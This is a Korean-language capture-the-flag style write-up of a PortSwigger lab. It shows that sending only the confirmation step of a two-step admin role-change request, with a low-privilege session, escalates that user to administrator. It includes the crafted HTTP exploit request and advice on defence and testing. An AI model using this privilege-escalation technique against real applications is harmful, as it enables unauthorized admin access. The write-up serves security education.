+++
date = '2026-07-04T18:00:00+09:00'
draft = false
title = '[Write-up] PortSwigger - Multi-step process with no access control on one step'
summary = "역할 변경 2단계 중 확인 단계만 권한 검사가 빠진 점을 이용해 확인 요청을 단독으로 보내 관리자가 되는 풀이"
toc = true
tags = ["Access Control", "Authorization", "Privilege Escalation", "PortSwigger", "Practitioner"]
+++

---

## 문제 분석

> **난이도**: `PRACTITIONER`  
> **Lab**: [Multi-step process with no access control on one step](https://portswigger.net/web-security/access-control/lab-multi-step-process-with-no-access-control-on-one-step)

> ![image.png](/writeup/portswigger/access-control/12/1.png)

관리자 패널의 사용자 역할 변경이 여러 단계로 이루어지는데, 그 과정에 결함이 있다. 관리자 패널은 `administrator:admin` 계정으로 미리 둘러볼 수 있으며, `wiener:peter` 계정으로 로그인해 접근 제어 결함을 이용해 스스로 관리자가 되면 문제가 해결된다.

### Access Control 진단

관리자 계정으로 패널 기능을 살펴본다.

![image.png](/writeup/portswigger/access-control/12/2.png)

사용자를 선택해 업그레이드·다운그레이드할 수 있는데, 선택 후 **정말 변경할 것인지 묻는 확인 단계**가 한 번 더 나온다.

![image.png](/writeup/portswigger/access-control/12/3.png)

두 단계의 요청은 다음과 같다.

```http
POST /admin-roles HTTP/2
Host: <lab-id>.web-security-academy.net
Cookie: session=<admin-session>
Content-Type: application/x-www-form-urlencoded

username=carlos&action=upgrade
```

```http
POST /admin-roles HTTP/2
Host: <lab-id>.web-security-academy.net
Cookie: session=<admin-session>
Content-Type: application/x-www-form-urlencoded

action=upgrade&confirmed=true&username=carlos
```

두 요청 모두 같은 엔드포인트로 가며, 두 번째는 `confirmed=true`가 붙는다. 확인 단계(`confirmed=true`)만 단독으로 보내 보면, 앞 단계 없이도 바로 역할 변경이 수행된다. 이 요청의 세션을 `wiener` 것으로 바꿔 보내도 정상 처리된다 — **확인 단계에는 권한 검사가 빠져 있다.**

---

## 익스플로잇

`wiener` 계정으로 로그인해 얻은 세션으로, 확인 단계 요청을 직접 구성한다.

```http
POST /admin-roles HTTP/2
Host: <lab-id>.web-security-academy.net
Cookie: session=<wiener-session>
Content-Type: application/x-www-form-urlencoded

action=upgrade&confirmed=true&username=wiener
```

요청이 정상 처리되어 `wiener`가 관리자로 승격되며, 문제가 해결된다.

![image.png](/writeup/portswigger/access-control/12/4.png)

---

## 정리

이 랩은 컨텍스트 의존(context-dependent) 접근 제어의 결함이다. 역할 변경은 "선택 → 확인"이라는 순서를 전제로 설계됐고, 개발자는 첫 단계에 권한 검사를 걸면 뒤 단계는 자연히 보호된다고 가정했다. 정상 흐름에서는 확인 단계가 선택 단계 뒤에만 오기 때문이다. 그러나 공격자는 그 순서를 지킬 의무가 없다. 확인 요청을 **단독으로** 보내면 앞 단계의 검사는 애초에 통과할 일이 없다.

핵심은 다단계 프로세스에서 **각 단계가 독립적인 요청**이라는 사실이다. 서버는 이 확인 요청이 정당한 선택 단계를 거쳐 왔는지 알지 못한다. 앞 단계를 마쳤다는 상태가 세션에 안전하게 저장되어 검증되지 않는 한, 마지막 단계는 언제든 직접 호출될 수 있는 독립 엔드포인트일 뿐이다.

이는 [메서드 기반 우회](/write-up/portswigger/access-control/write-up-portswigger---method-based-access-control-can-be-circumvented/) 랩과 마찬가지로 검증이 "행위" 아닌 "조건"에 걸린 문제다. 그쪽은 조건이 메서드였고, 이쪽은 조건이 "앞 단계를 거쳤을 것"이라는 암묵적 가정이다. 어느 쪽이든 공격자는 그 가정이 성립하지 않는 경로로 같은 행위에 도달한다.

진단에서는 확인·완료·결제처럼 여러 단계로 나뉜 상태 변경 기능을 찾아, **마지막 단계 요청을 앞 단계 없이 단독으로** 보내 본다. 세션을 낮은 권한 계정 것으로 바꿔 각 단계가 개별적으로 권한을 검사하는지 확인한다. 방어는 프로세스의 **모든 단계에서** 권한과 진행 상태를 검증하는 것이다. 마지막 단계 하나라도 검사가 빠지면 그 앞의 모든 검사는 우회된다. 진단 흐름은 [Access Control Playbook](/playbook/playbook-access-control-%EC%A7%84%EB%8B%A8-cheat-sheet/)에 정리했다.
